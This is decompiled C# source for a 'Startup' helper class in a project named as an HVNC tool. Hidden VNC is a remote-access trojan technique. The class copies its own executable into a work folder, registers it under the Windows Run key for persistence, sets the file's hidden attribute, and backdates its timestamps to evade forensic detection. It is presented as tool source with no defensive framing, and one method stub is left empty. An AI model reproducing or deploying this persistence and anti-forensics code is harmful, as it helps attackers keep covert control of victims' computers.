using System;
using System.IO;
using Microsoft.Win32;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000E7 RID: 231
	internal sealed class Startup
	{
		// Token: 0x060008F1 RID: 2289 RVA: 0x0006191C File Offset: 0x0005FB1C
		public static void SetFileCreationDate(string path = null)
		{
			string text = path;
			if (path == null)
			{
				text = ExecutablePath;
			}
			Logging.Log();
			DateTime dateTime = new DateTime(DateTime.Now.Year - 2, 5, 22, 3, 16, 28);
			File.SetCreationTime(text, dateTime);
			File.SetLastWriteTime(text, dateTime);
			File.SetLastAccessTime(text, dateTime);
		}

		// Token: 0x060008F2 RID: 2290 RVA: 0x00061974 File Offset: 0x0005FB74
		public static void HideFile(string path = null)
		{
			string text = path;
			if (path == null)
			{
				text = ExecutablePath;
			}
			Logging.Log();
			new FileInfo(text).Attributes |= FileAttributes.Hidden;
		}

		// Token: 0x060008F3 RID: 2291 RVA: 0x000619AC File Offset: 0x0005FBAC
		public static bool IsInstalled()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(StartupKey, false);
			return registryKey != null && registryKey.GetValue(StartupName) != null && File.Exists(InstallFile);
		}

		// Token: 0x060008F4 RID: 2292 RVA: 0x000619E8 File Offset: 0x0005FBE8
		public static void Install()
		{
			Logging.Log();
			if (!File.Exists(InstallFile))
			{
				File.Copy(ExecutablePath, InstallFile);
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(StartupKey, true);
			if (registryKey != null && registryKey.GetValue(StartupName) == null)
			{
				registryKey.SetValue(StartupName, InstallFile);
			}
			foreach (string text in new[] { InstallFile })
			{
				if (File.Exists(text))
				{
					HideFile(text);
					SetFileCreationDate(text);
				}
			}
		}

		// Token: 0x060008F5 RID: 2293 RVA: 0x0000ACDC File Offset: 0x00008EDC
		public static bool IsFromStartup()
		{
			return ExecutablePath.StartsWith(InstallDirectory);
		}

		// Token: 0x060008F6 RID: 2294 RVA: 0x00006F52 File Offset: 0x00005152

        // Token: 0x060008F7 RID: 2295 RVA: 0x00061A84 File Offset: 0x0005FC84
		// Note: this type is marked as 'beforefieldinit'.
		static Startup()
		{
		}

		// Token: 0x0400073F RID: 1855
		public static readonly string ExecutablePath = AppDomain.CurrentDomain.BaseDirectory;

		// Token: 0x04000740 RID: 1856
		private static readonly string InstallDirectory = Paths.InitWorkDir();

		// Token: 0x04000741 RID: 1857
		private static readonly string InstallFile = Path.Combine(InstallDirectory, new FileInfo(ExecutablePath).Name);

		// Token: 0x04000742 RID: 1858
		private static readonly string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

		// Token: 0x04000743 RID: 1859
		private static readonly string StartupName = Path.GetFileNameWithoutExtension(ExecutablePath);
	}
}
